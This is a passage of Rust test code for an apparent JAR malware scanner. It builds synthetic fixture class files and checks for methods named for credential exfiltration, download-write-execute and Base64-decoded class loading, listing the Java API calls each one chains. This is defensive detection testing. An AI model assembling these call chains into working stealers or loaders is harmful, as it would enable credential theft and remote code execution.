        let index = self.next_index();
        self.bytes.push(12);
        self.bytes.extend_from_slice(&name_index.to_be_bytes());
        self.bytes
            .extend_from_slice(&descriptor_index.to_be_bytes());
        index
    }

    fn method_ref(&mut self, class_index: u16, name_and_type_index: u16) -> u16 {
        let index = self.next_index();
        self.bytes.push(10);
        self.bytes.extend_from_slice(&class_index.to_be_bytes());
        self.bytes
            .extend_from_slice(&name_and_type_index.to_be_bytes());
        index
    }

    fn reference(&mut self, reference: MethodReference) -> u16 {
        let owner_name = self.utf8(reference.owner);
        let owner = self.class(owner_name);
        let member_name = self.utf8(reference.name);
        let descriptor = self.utf8(reference.descriptor);
        let name_and_type = self.name_and_type(member_name, descriptor);
        self.method_ref(owner, name_and_type)
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::models::scan::{
        AnalysisCoverage, Capability, Confidence, Finding, Obfuscation, ObfuscationLevel,
        ScanReport,
    };
    use crate::scanner::class_file::{parse_class_file, ClassFileData};
    use std::io::Read;
    use tempfile::TempDir;

    #[test]
    fn every_fixture_spec_is_well_formed_and_materializes_to_a_safe_zip() {
        let root = Path::new(env!("CARGO_MANIFEST_DIR")).join(DEFAULT_FIXTURES_ROOT);
        let specs = load_fixture_specs(&root).expect("fixture specifications load");
        assert!(
            specs.len() >= 13,
            "the corpus must retain the original eight cases and data-flow regressions"
        );

        let temporary_directory = TempDir::new().expect("temporary directory");
        for (_, spec) in specs {
            assert!(
                validate_spec(&spec).is_empty(),
                "invalid fixture: {}",
                spec.name
            );
            let archive_path = temporary_directory
                .path()
                .join(format!("{}.jar", spec.name));
            materialize_fixture(&archive_path, spec.scenario.expect("synthetic scenario"))
                .expect("fixture archive materializes");
            let archive =
                zip::ZipArchive::new(fs::File::open(&archive_path).expect("fixture opens"));
            assert!(
                archive.is_ok(),
                "fixture must be a valid zip: {}",
                spec.name
            );
        }
    }

    #[test]
    fn legacy_assertions_check_only_fields_available_in_scan_outcome() {
        let spec = FixtureSpec {
            name: "test".to_owned(),
            scenario: Some(Scenario::ConfigWrite),
            expected_verdict: ExpectedVerdict::One(Verdict::Clean),
            risk_score: ScoreRange { min: 0, max: 3 },
            required_findings: vec!["REQUIRED".to_owned()],
            forbidden_findings: vec!["FORBIDDEN".to_owned()],
            expected_capabilities: vec!["CONFIG_FILE_WRITE".to_owned()],
            required_confirmed_chains: Vec::new(),
            forbidden_confirmed_chains: Vec::new(),
            minimum_analysis_coverage: 0,
            required_chain_scope: None,
            required_chain_evidence_operations: Vec::new(),
            required_limitations: Vec::new(),
            forbidden_limitations: Vec::new(),
            expected_obfuscation_level: ObfuscationLevel::None,
        };
        let finding = Finding::legacy(
            "REQUIRED",
            "test",
            models::scan::Severity::Low,
            String::new(),
        );
        let outcome = ScanOutcome {
            report: ScanReport {
                verdict: Verdict::Clean,
                risk_score: 0,
                confidence: Confidence::High,
                obfuscation_score: 0,
                analysis_coverage: AnalysisCoverage::default(),
                capabilities: vec![Capability {
                    rule_id: "CONFIG_FILE_WRITE".to_owned(),
                    message: String::new(),
                    evidence: Vec::new(),
                }],
                decoded_strings: Vec::new(),
                text_resources: Vec::new(),
                findings: vec![finding.clone()],
                confirmed_chains: Vec::new(),
                obfuscation: Obfuscation::default(),
                limitations: Vec::new(),
            },
            verdict: Verdict::Clean,
            risk_score: 0,
            summary: String::new(),
            findings: vec![finding],
        };

        assert!(assert_report(&spec, &outcome).is_empty());
    }

    #[test]
    fn chain_fixtures_expose_local_value_flow_and_api_calls() {
        const AUTO_UPDATER_CALLS: &[(&str, &str)] = &[
            ("java/net/http/HttpClient", "send"),
            ("java/nio/file/Files", "write"),
            ("java/lang/Runtime", "exec"),
        ];
        const CREDENTIAL_EXFILTRATION_CALLS: &[(&str, &str)] = &[
            ("java/nio/file/Files", "readAllBytes"),
            ("java/net/http/HttpClient", "post"),
        ];
        const DYNAMIC_CLASS_LOADING_CALLS: &[(&str, &str)] = &[
            ("java/util/Base64", "getDecoder"),
            ("java/util/Base64$Decoder", "decode"),
            ("java/lang/ClassLoader", "defineClass"),
        ];
        let cases = [
            (
                Scenario::AutoUpdater,
                "downloadWriteExecute",
                AUTO_UPDATER_CALLS,
            ),
            (
                Scenario::CredentialStealer,
                "readCredentialsAndExfiltrate",
                CREDENTIAL_EXFILTRATION_CALLS,
            ),
            (
                Scenario::ObfuscatedLoader,
                "decodeAndDefineClass",
                DYNAMIC_CLASS_LOADING_CALLS,
            ),
        ];
        let temporary_directory = TempDir::new().expect("temporary directory");

        for (scenario, method_name, expected_calls) in cases {
            let archive_path = temporary_directory
                .path()
                .join(format!("{method_name}.jar"));
            materialize_fixture(&archive_path, scenario).expect("fixture archive materializes");
            let class_file = fixture_class_bytes(&archive_path);
            let parsed = parse_class_file(&class_file).expect("fixture class parses");
            assert_method_contains_calls(&parsed, method_name, expected_calls);
        }
    }

    fn fixture_class_bytes(archive_path: &Path) -> Vec<u8> {
        let file = fs::File::open(archive_path).expect("fixture archive opens");
        let mut archive = zip::ZipArchive::new(file).expect("fixture archive is a zip");
        let mut class = archive
            .by_name(&format!("{FIXTURE_CLASS_NAME}.class"))
            .expect("fixture class exists");
        let mut bytes = Vec::new();
        class
            .read_to_end(&mut bytes)
            .expect("fixture class reads without executing it");
        bytes
    }

    fn assert_method_contains_calls(
        parsed: &ClassFileData,
        method_name: &str,
        expected_calls: &[(&str, &str)],
    ) {
        let method = parsed
            .methods
            .iter()
            .find(|method| method.method_name == method_name)
            .unwrap_or_else(|| panic!("missing fixture method {method_name}"));
        assert!(
            method
                .instructions
                .iter()
                .any(|instruction| instruction.opcode == 0x3a),
            "{method_name} must store a value in a local variable"
        );
        assert!(
            method
                .instructions
                .iter()
                .any(|instruction| instruction.opcode == 0x19),
            "{method_name} must load a value from a local variable"
        );
        for (owner, name) in expected_calls {
            assert!(
                method
                    .calls
                    .iter()
                    .any(|call| { call.owner.as_deref() == Some(*owner) && call.name == *name }),
                "{method_name} must call {owner}.{name}"
            );
        }
    }
}
